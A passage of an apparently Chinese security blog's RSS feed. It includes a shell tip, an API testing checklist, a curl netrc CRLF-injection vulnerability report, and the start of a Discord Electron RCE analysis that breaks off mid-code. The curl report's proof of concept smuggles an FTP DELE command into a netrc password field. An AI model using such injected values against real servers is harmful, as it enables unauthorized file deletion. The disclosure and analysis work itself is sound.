&lt;p&gt;通过本文分析，我们希望研究人员能更深入地探索虚拟化堆栈安全。如有问题，欢迎通过Twitter(@AmarSaar)联系作者Saar Amar。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>统计目录中Java代码行数的简便方法</title>
        <link>http://localhost:1313/p/%E7%BB%9F%E8%AE%A1%E7%9B%AE%E5%BD%95%E4%B8%ADjava%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0%E7%9A%84%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/</link>
        <pubDate>Sun, 03 Aug 2025 04:19:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%9F%E8%AE%A1%E7%9B%AE%E5%BD%95%E4%B8%ADjava%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0%E7%9A%84%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/</guid>
        <description>&lt;h1 id=&#34;统计目录中java代码行数&#34;&gt;统计目录中Java代码行数
&lt;/h1&gt;&lt;p&gt;我最近需要统计一个目录中所有Java代码文件的总行数（包括子目录）。通过组合Linux的&lt;code&gt;find&lt;/code&gt;和&lt;code&gt;wc&lt;/code&gt;命令，可以轻松实现这个需求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find . -type f -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;*java&amp;#39;&lt;/span&gt; -print0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wc -l --files0-from&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个命令的工作原理是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;find&lt;/code&gt;命令递归查找当前目录(.)下所有扩展名为.java的文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-print0&lt;/code&gt;参数用null字符分隔文件名，可以正确处理包含空格的文件名&lt;/li&gt;
&lt;li&gt;结果通过管道传递给&lt;code&gt;wc -l&lt;/code&gt;命令统计总行数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--files0-from=-&lt;/code&gt;参数告诉wc从标准输入读取文件名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;示例输出：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;56 ./App.java
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;550 total
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个简单的命令组合可以快速统计项目中的代码量，对于评估项目规模或代码审查非常有用。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>curl netrc文件CRLF注入漏洞分析</title>
        <link>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 04:08:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;curl-netrc-crlf注入漏洞报告&#34;&gt;curl netrc crlf注入漏洞报告
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;curl允许在netrc文件的登录和密码字段中编码CR和LF字符。当攻击者能够影响netrc文件内容时，可通过在登录名或密码中注入CRLF来实现FTP命令注入。POP3协议同样可能受影响但未经测试。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现步骤&#34;&gt;漏洞复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;创建包含恶意payload的netrc文件：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;machine localhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  login alice
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  password &amp;#34;alicespassword\r\nDELE pocfile.txt&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;启动测试用的FTP服务器：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -ne &lt;span class=&#34;s2&#34;&gt;&amp;#34;220 \r\n331 \r\n&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc -v -l -p &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;使用受影响curl版本发起请求：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -v --netrc-file netrc ftp://localhost:9999
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;对于使用CR/LF作为分隔符的协议（如FTP、POP3等），在构造命令时不应允许用户名或密码中包含CR或LF字符。&lt;/p&gt;
&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
&lt;/h2&gt;&lt;p&gt;可实现FTP/POP3命令注入。项目方最终认定该问题属于&amp;quot;本地攻击者已存在&amp;quot;类别，不构成安全漏洞。&lt;/p&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2024年11月9日：漏洞报告提交&lt;/li&gt;
&lt;li&gt;2024年11月10日：curl团队确认问题性质&lt;/li&gt;
&lt;li&gt;2024年11月10日：报告关闭（标记为Not Applicable）&lt;/li&gt;
&lt;li&gt;2025年7月7日：报告公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>API安全测试清单：7个关键步骤</title>
        <link>http://localhost:1313/p/api%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%957%E4%B8%AA%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4/</link>
        <pubDate>Sun, 03 Aug 2025 03:42:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/api%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%957%E4%B8%AA%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4/</guid>
        <description>&lt;h1 id=&#34;api安全测试清单7个关键步骤&#34;&gt;API安全测试清单：7个关键步骤
&lt;/h1&gt;&lt;p&gt;API是恶意攻击者的常见攻击载体。使用我们的API安全测试清单和最佳实践来保护您的组织及其数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;：Dave Shackleford（Voodoo Security）、Michael Cobb&lt;br&gt;
&lt;strong&gt;发布日期&lt;/strong&gt;：2024年11月1日&lt;/p&gt;
&lt;p&gt;API使应用程序能够交换和消费数据及服务。由于其能够访问组织的敏感数据，API成为恶意黑客和威胁行为者的诱人目标。组织必须保护其API，以保护企业资源以及使用API的其他应用程序和组织。&lt;/p&gt;
&lt;p&gt;团队应进行API安全测试，以确保API在负载下保持可用。测试还必须确定API暴露的数据和资源的机密性、完整性和可用性。API安全测试应全面且持续，以便解决漏洞发现和修复问题，并增强对攻击者的抵御能力。测试应证明安全控制的有效性，并在必要时提供需要修复的领域的见解。组织应将API测试与OpenAPI规范对齐，以确保其完整和彻底。&lt;/p&gt;
&lt;h2 id=&#34;api安全测试清单&#34;&gt;API安全测试清单
&lt;/h2&gt;&lt;p&gt;以下最佳实践可帮助确保API安全测试计划足够彻底，以有效防范API安全风险。&lt;/p&gt;
&lt;h3 id=&#34;1-确定谁对测试和维护api安全负总责&#34;&gt;1. 确定谁对测试和维护API安全负总责
&lt;/h3&gt;&lt;p&gt;许多团队参与API生命周期，项目在进展过程中会经历大量快速变化和迭代。重要的是指定一个人记录所有API，确保所有测试完成并采取行动。&lt;/p&gt;
&lt;p&gt;随着对云服务和Web应用程序环境的日益重视，与过去相比，可能有更多的业务部门和其他应用程序所有者参与API安全治理。这使得有一个中央联系点变得更加重要。&lt;/p&gt;
&lt;h3 id=&#34;2-为安全测试预算时间和资源&#34;&gt;2. 为安全测试预算时间和资源
&lt;/h3&gt;&lt;p&gt;安全测试需要时间和金钱，因此组织在启动新项目时需要考虑这些因素。威胁建模突出了需要缓解的潜在API风险和常见漏洞，但请注意，项目上线后维护和更新API测试的预算也是必要的。&lt;/p&gt;
&lt;p&gt;请注意，由第三方提供商开发和维护的任何API可能随时更改。安全和应用程序团队应确保在规划和项目周期中考虑动态API测试。&lt;/p&gt;
&lt;h3 id=&#34;3-注册分类并记录每个api的用途及其功能&#34;&gt;3. 注册、分类并记录每个API的用途及其功能
&lt;/h3&gt;&lt;p&gt;记录API及其用途。这些信息有助于测试评估API是否可以处理可接受的操作和有效数据，以及不可接受的操作或无效数据。诸如OpenAPI规范、AsyncAPI和GraphQL Introspection等标准使人类和机器能够发现和理解API的响应和能力。许多API工具使用这些规范来加速API的开发生命周期。&lt;/p&gt;
&lt;h3 id=&#34;4-尽早运行测试并尽可能自动化&#34;&gt;4. 尽早运行测试并尽可能自动化
&lt;/h3&gt;&lt;p&gt;如果在开发生命周期的早期发现安全问题，每个人都可以节省时间和金钱。有许多API安全工具可用，无论是开源还是许可的，都可以集成到现有的工作流程和持续集成/持续交付管道中。具有模拟服务的工具消除了构建生产系统全规模复制的需要。&lt;/p&gt;
&lt;p&gt;此外，确定谁将执行测试——开发人员、安全团队或外部渗透测试人员（如果内部缺乏技能）——以及何时运行测试。理想情况下，应在应用程序的每个构建上运行测试。许多API测试工具现在可以完全集成，以便按需进行持续或触发的测试。&lt;/p&gt;
&lt;h3 id=&#34;5-定义要运行的测试类型&#34;&gt;5. 定义要运行的测试类型
&lt;/h3&gt;&lt;p&gt;对API安全评估进行以下测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无效输入&lt;/strong&gt;：API的输入应被视为来自不受信任的源，并相应地进行清理和验证。模糊测试可用于向API发送随机数据，以查看其是否可以在不崩溃的情况下处理意外数据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;注入攻击&lt;/strong&gt;：使用这些测试攻击来确保API拒绝尝试操纵后端数据库或在服务器上执行OS命令的请求，而不暴露任何敏感信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数篡改&lt;/strong&gt;：通过API请求发送的参数（如购物车中商品的价格）容易被攻击者更改。参数篡改检查API在处理参数之前是否验证和检查参数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;未处理的HTTP方法&lt;/strong&gt;：使用所有八种HTTP方法发送请求，以确保不必要的&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Discord桌面应用远程代码执行漏洞分析</title>
        <link>http://localhost:1313/p/discord%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 03:25:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/discord%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;discord桌面应用rce漏洞分析&#34;&gt;Discord桌面应用RCE漏洞分析
&lt;/h1&gt;&lt;p&gt;几个月前，我在Discord桌面应用中发现了一个远程代码执行漏洞，并通过其漏洞赏金计划进行了报告。这个RCE漏洞的有趣之处在于它需要组合多个漏洞才能实现。本文将分享详细的技术细节。&lt;/p&gt;
&lt;h2 id=&#34;选择discord作为目标的原因&#34;&gt;选择Discord作为目标的原因
&lt;/h2&gt;&lt;p&gt;我当时想研究Electron应用的安全漏洞，于是寻找提供Electron应用漏洞赏金的项目，最终选择了Discord。同时，作为Discord用户，我也想确认自己使用的应用是否安全。&lt;/p&gt;
&lt;h2 id=&#34;发现的漏洞&#34;&gt;发现的漏洞
&lt;/h2&gt;&lt;p&gt;我主要发现了以下三个漏洞，通过组合它们实现了RCE：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;缺失contextIsolation&lt;/li&gt;
&lt;li&gt;iframe嵌入中的XSS&lt;/li&gt;
&lt;li&gt;导航限制绕过(CVE-2020-15174)&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;缺失contextisolation&#34;&gt;缺失contextIsolation
&lt;/h3&gt;&lt;p&gt;在测试Electron应用时，我首先检查了用于创建浏览器窗口的BrowserWindow API选项。通过分析这些选项，可以评估在渲染器中执行任意JavaScript时实现RCE的可能性。&lt;/p&gt;
&lt;p&gt;Discord的Electron应用虽然不是开源项目，但其JavaScript代码以asar格式保存在本地，解压后即可阅读。&lt;/p&gt;
&lt;p&gt;主窗口使用了以下选项：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mainWindowOptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Discord&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;backgroundColor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getBackgroundColor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DEFAULT_WIDTH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DEFAULT_HEIGHT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;minWidth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;MIN_WIDTH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;minHeight&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;MIN_HEIGHT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;transparent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;frame&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;resizable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isVisible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;webPreferences&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;blinkFeatures&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;EnumerateDevices,AudioOutputDevices&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;nodeIntegration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;preload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_path2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__dirname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mainScreenPreload.js&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;nativeWindowOpen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;enableRemoteModule&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;spellcheck&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;其中最重要的是nodeIntegration和contextIsolation选项。从代码中可以看出，nodeIntegration设为false，而contextIsolation保持默认值false。&lt;/p&gt;
&lt;p&gt;如果nodeIntegration设为true，网页JavaScript可以直接通过require()使用Node.js功能。例如在Windows上执行calc应用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
